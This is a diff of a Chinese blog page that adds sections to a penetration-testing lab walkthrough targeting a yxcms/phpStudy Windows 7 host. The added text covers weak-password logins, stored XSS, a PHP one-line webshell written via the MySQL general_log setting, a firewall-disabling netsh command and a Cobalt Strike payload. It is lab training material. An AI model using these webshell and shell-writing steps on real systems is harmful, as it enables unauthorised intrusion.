@@ -35,13 +35,33 @@
 <meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/6.png">
 <meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/7.png">
 <meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/8.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/9.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/10.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/11.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/12.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/13.jpg">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/14.jpg">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/13.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/14.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/15.jpg">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/15.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/16.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/17.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/18.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/19.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/20.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/21.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/22.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/23.png">
+<meta property="og:image" content="http://swanq.top/2021/05/14/PenetrationRange/24.png">
 <meta property="article:published_time" content="2021-05-14T12:00:13.000Z">
-<meta property="article:modified_time" content="2021-05-14T13:40:58.997Z">
+<meta property="article:modified_time" content="2021-05-22T13:36:22.271Z">
 <meta property="article:author" content="swanQ">
 <meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="靶场">
 <meta property="article:tag" content="域环境搭建">
 <meta property="article:tag" content="域控">
+<meta property="article:tag" content="cobalt strike">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://swanq.top/2021/05/14/PenetrationRange/4.png">
 
@@ -186,12 +206,32 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-05-14 20:00:13 / 修改时间：21:40:58" itemprop="dateCreated datePublished" datetime="2021-05-14T20:00:13+08:00">2021-05-14</time>
+              <time title="创建时间：2021-05-14 20:00:13" itemprop="dateCreated datePublished" datetime="2021-05-14T20:00:13+08:00">2021-05-14</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-22 21:36:22" itemprop="dateModified" datetime="2021-05-22T21:36:22+08:00">2021-05-22</time>
+              </span>
 
-          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
 
         </div>
       </header>
@@ -215,7 +255,7 @@
 <p><img src="/2021/05/14/PenetrationRange/3.png"></p>
 <p>参考下图:<br><img src="/2021/05/14/PenetrationRange/1.png"></p>
 <p>开启win7的phpstudy,同时测试win7是否可以pingkali和内网的两台主机。ping通over，环境搭建到此结束。</p>
-<h1 id="2-攻击流程"><a href="#2-攻击流程" class="headerlink" title="2. 攻击流程"></a>2. 攻击流程</h1><h2 id="0x01-主机发现："><a href="#0x01-主机发现：" class="headerlink" title="0x01 主机发现："></a>0x01 主机发现：</h2><p>DMZ区也就是处于两个防火墙之间的，一个合格的DMZ区是为了提供外部主机访问内网资源服务器的一个缓冲区域，应该有着严格的内外网隔离，本次靶场只是一个模拟，dmz区并没有很合规。</p>
+<h1 id="2-攻击流程"><a href="#2-攻击流程" class="headerlink" title="2. 攻击流程"></a>2. 攻击流程</h1><h2 id="0x01-主机发现"><a href="#0x01-主机发现" class="headerlink" title="0x01 主机发现"></a>0x01 主机发现</h2><p>DMZ区也就是处于两个防火墙之间的，一个合格的DMZ区是为了提供外部主机访问内网资源服务器的一个缓冲区域，应该有着严格的内外网隔离，本次靶场只是一个模拟，dmz区并没有很合规。</p>
 <p>那么入手以后，先进行信息收集，桥接嘛，那么直接扫一下桥接网段的存活主机</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.140.0/24</span><br><span class="line"></span><br><span class="line">netdiscover -i eth0 -r 192.168.140.0/24</span><br></pre></td></tr></table></figure>
 
@@ -227,6 +267,54 @@
 <p><img src="/2021/05/14/PenetrationRange/7.png"></p>
 <p>80端口是一个phpstudy探针：</p>
 <p><img src="/2021/05/14/PenetrationRange/8.png"></p>
+<p>最下方有数据库登陆框测试mysql连同，尝试root/root即可登陆。初步getshell思路就是通过mysql拿shell。</p>
+<p><img src="/2021/05/14/PenetrationRange/9.png"></p>
+<p>目录扫描还是御剑靠谱一点，扫出beifen.rar。</p>
+<p><img src="/2021/05/14/PenetrationRange/10.png"></p>
+<p>备份文件发现网站源码，打开robots.txt发现网站CMS为yxcms，访问<code>http://192.168.1.102/yxcms</code>进入网站首页</p>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="漏洞一：信息泄露-弱口令"><a href="#漏洞一：信息泄露-弱口令" class="headerlink" title="漏洞一：信息泄露+弱口令"></a>漏洞一：信息泄露+弱口令</h3><p>网站<a target="_blank" rel="noopener" href="http://192.168.1.102/yxcms%E5%90%8E%E5%8F%B0%E6%B3%84%E9%9C%B2%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E5%9C%B0%E5%9D%80%E5%92%8C%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E3%80%82">http://192.168.1.102/yxcms后台泄露后台登陆地址和用户密码。</a></p>
+<p><img src="/2021/05/14/PenetrationRange/11.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/12.png"></p>
+<p>成功登陆后台管理页面，可以添加、编辑、删除管理员，管理数据库及上传文件。</p>
+<h3 id="漏洞二：PhpMyAdmin弱口令"><a href="#漏洞二：PhpMyAdmin弱口令" class="headerlink" title="漏洞二：PhpMyAdmin弱口令"></a>漏洞二：PhpMyAdmin弱口令</h3><p>使用默认用户名/口令（root/root）成功登录PhpMyAdmin管理页面，可以看到数据库的所有内容</p>
+<p><img src="/2021/05/14/PenetrationRange/13.jpg"></p>
+<h3 id="漏洞三：yxcms留言本XSS存储型漏洞"><a href="#漏洞三：yxcms留言本XSS存储型漏洞" class="headerlink" title="漏洞三：yxcms留言本XSS存储型漏洞"></a>漏洞三：yxcms留言本XSS存储型漏洞</h3><p>前台提交带有XSS代码的留言，后台审核成功弹出XSS弹窗，审核通过之后，前台成功弹窗。通过该漏洞可以获取管理员cookie或者诱导管理员点击执行某恶意代码</p>
+<p><img src="/2021/05/14/PenetrationRange/14.jpg"></p>
+<p><img src="/2021/05/14/PenetrationRange/13.png"></p>
+<h3 id="漏洞四：yxcms后台任意文件读写漏洞"><a href="#漏洞四：yxcms后台任意文件读写漏洞" class="headerlink" title="漏洞四：yxcms后台任意文件读写漏洞"></a>漏洞四：yxcms后台任意文件读写漏洞</h3><p>后台管理首页–&gt; 前台模板–&gt;管理模板文件 –&gt;新建hack.php文件</p>
+<p><img src="/2021/05/14/PenetrationRange/14.png"></p>
+<p>找备份文件即可看到文件的保存目录为：<a target="_blank" rel="noopener" href="http://192.168.1.102/yxcms/protected/apps/default/view/default/hack.php">http://192.168.1.102/yxcms/protected/apps/default/view/default/hack.php</a></p>
+<p><img src="/2021/05/14/PenetrationRange/15.jpg"></p>
+<p>使用蚁剑成功连接：</p>
+<p><img src="/2021/05/14/PenetrationRange/15.png"></p>
+<h3 id="漏洞五：PhpMyAdmin开启全局日志getshell"><a href="#漏洞五：PhpMyAdmin开启全局日志getshell" class="headerlink" title="漏洞五：PhpMyAdmin开启全局日志getshell"></a>漏洞五：PhpMyAdmin开启全局日志getshell</h3><ol>
+<li><p>测试是否可以使用into outfile写入文件到web目录：Select ‘<?php eval($_POST[hack]);?> ‘ into outfile ‘C:/phpStudy/WWW/hack.php’。发现写入失败。</p>
+</li>
+<li><p>再查看变量secure-file-priv 值： <code>show global variables like ‘%secure%’</code>发现为NULL，为只读无法修改。</p>
+</li>
+</ol>
+<p><img src="/2021/05/14/PenetrationRange/16.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/17.png"></p>
+<ol start="3">
+<li><p>尝试用全局日志写shell，查看全局变量general_log：<code>show global variables like ‘%general_%’</code>。于是开启全局日志并修改日志保存位置为C:/phpStudy/WWW/hack.php</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/hack.php&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="/2021/05/14/PenetrationRange/18.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/19.png"></p>
+<p>查询一句话写入日志<code>Select &#39;&lt;?php eval($_POST[hack]);?&gt;&#39;</code></p>
+<p><img src="/2021/05/14/PenetrationRange/20.png"></p>
+<p>使用蚁剑连接一句话木马<code>http://192.168.140.130/hack.php</code>。web目录直接IP加文件名就好。</p>
+<h3 id="漏洞六：yxcms后台SQL注入漏洞"><a href="#漏洞六：yxcms后台SQL注入漏洞" class="headerlink" title="漏洞六：yxcms后台SQL注入漏洞"></a>漏洞六：yxcms后台SQL注入漏洞</h3><p>待补充。其他博客的资料此处有问题。</p>
+<p>前渗透到此结束，下面为后渗透流程</p>
+<h2 id="0x03-getshell"><a href="#0x03-getshell" class="headerlink" title="0x03 getshell"></a>0x03 getshell</h2><p>此时会用到Cobalt Strike, 以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。</p>
+<p>我们用kali作为CS服务器，用蚁剑给win7上传java 11和CS。CS服务器和CS客户端分别如下：</p>
+<p><img src="/2021/05/14/PenetrationRange/21.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/22.png"></p>
+<p>选择监听器，为后头生成木马做铺垫</p>
+<p>蚁剑关闭防火墙：终端执行：netsh advfirewall set allprofiles state off</p>
+<p><img src="/2021/05/14/PenetrationRange/23.png"></p>
+<p>生成木马artifact.exe.（Attacks -&gt; Packages -&gt; Windows Executable ）,并用蚁剑上传win7。用蚁剑终端执行artifact.exe之后，win7提示artifact.exe已停止工作。</p>
+<p><img src="/2021/05/14/PenetrationRange/24.png"></p>
 
     </div>
 
@@ -240,6 +328,7 @@
               <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
               <a href="/tags/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag"># 域环境搭建</a>
               <a href="/tags/%E5%9F%9F%E6%8E%A7/" rel="tag"># 域控</a>
+              <a href="/tags/cobalt-strike/" rel="tag"># cobalt strike</a>
           </div>
 
         
@@ -251,7 +340,10 @@
     <a href="/2021/05/05/bulldog/" rel="prev" title="渗透测试之bulldog">
       <i class="fa fa-chevron-left"></i> 渗透测试之bulldog
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2021/05/22/%E4%BA%91%E8%AE%A1%E7%AE%97%E5%8F%96%E8%AF%81%E7%BB%BC%E8%BF%B0/" rel="next" title="云计算取证综述">
+      云计算取证综述 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -310,7 +402,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">1. 环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">2. 攻击流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 主机发现：</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">1. 环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">2. 攻击流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%B8%80%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">2.2.1.</span> <span class="nav-text">漏洞一：信息泄露+弱口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%8C%EF%BC%9APhpMyAdmin%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">2.2.2.</span> <span class="nav-text">漏洞二：PhpMyAdmin弱口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%B8%89%EF%BC%9Ayxcms%E7%95%99%E8%A8%80%E6%9C%ACXSS%E5%AD%98%E5%82%A8%E5%9E%8B%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.2.3.</span> <span class="nav-text">漏洞三：yxcms留言本XSS存储型漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%9B%9B%EF%BC%9Ayxcms%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.2.4.</span> <span class="nav-text">漏洞四：yxcms后台任意文件读写漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%94%EF%BC%9APhpMyAdmin%E5%BC%80%E5%90%AF%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97getshell"><span class="nav-number">2.2.5.</span> <span class="nav-text">漏洞五：PhpMyAdmin开启全局日志getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%85%AD%EF%BC%9Ayxcms%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.2.6.</span> <span class="nav-text">漏洞六：yxcms后台SQL注入漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-getshell"><span class="nav-number">2.3.</span> <span class="nav-text">0x03 getshell</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -324,7 +416,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -333,7 +425,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">37</span>
+        <span class="site-state-item-count">42</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -365,6 +457,16 @@
     <i class="fa fa-heart"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">swanQ</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">NaNm</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">NaN:aN</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
